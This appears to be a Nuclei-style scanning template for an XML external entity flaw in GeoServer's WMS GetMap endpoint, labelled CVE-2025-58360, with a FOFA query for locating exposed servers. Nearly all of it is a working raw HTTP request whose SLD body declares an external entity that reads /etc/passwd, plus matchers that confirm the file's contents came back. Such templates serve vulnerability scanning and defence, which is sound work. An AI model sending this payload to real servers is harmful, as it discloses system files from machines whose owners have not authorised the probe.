id: geoserver-WMS-xxe-CVE-2025-58360

info:
  name: geoserver-WMS-xxe-CVE-2025-58360
  author: PokerSec
  severity: high
  metadata:
    fofa-search: app="GeoServer"

requests:
  - raw:
      - |-
        POST /geoserver/wms?service=WMS&version=1.1.0&request=GetMap&layers=topp:states&bbox=-130,24,-66,50&width=800&height=400&srs=EPSG:4326&format=image/png HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/vnd.ogc.sld+xml
        Content-Length: 299

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE StyledLayerDescriptor [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <StyledLayerDescriptor version="1.0.0" xmlns="http://www.opengis.net/sld">
          <NamedLayer>
            <Name>&xxe;</Name>
            <UserStyle/>
          </NamedLayer>
        </StyledLayerDescriptor>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
      - type: status
        status:
          - 200
